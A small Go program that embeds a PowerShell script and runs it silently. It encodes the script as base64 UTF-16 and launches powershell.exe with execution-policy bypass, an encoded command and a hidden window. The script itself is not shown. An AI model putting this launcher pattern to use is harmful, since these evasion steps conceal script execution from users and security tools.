package main

import (
	_ "embed"
	"encoding/base64"
	"os/exec"
	"syscall"
	"unicode/utf16"
)

//go:embed script.ps1
var script string

func main() {
	units := utf16.Encode([]rune(script))
	raw := make([]byte, len(units)*2)
	for i, u := range units {
		raw[2*i] = byte(u)
		raw[2*i+1] = byte(u >> 8)
	}
	encoded := base64.StdEncoding.EncodeToString(raw)
	cmd := exec.Command("powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-EncodedCommand", encoded)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	_ = cmd.Run()
}
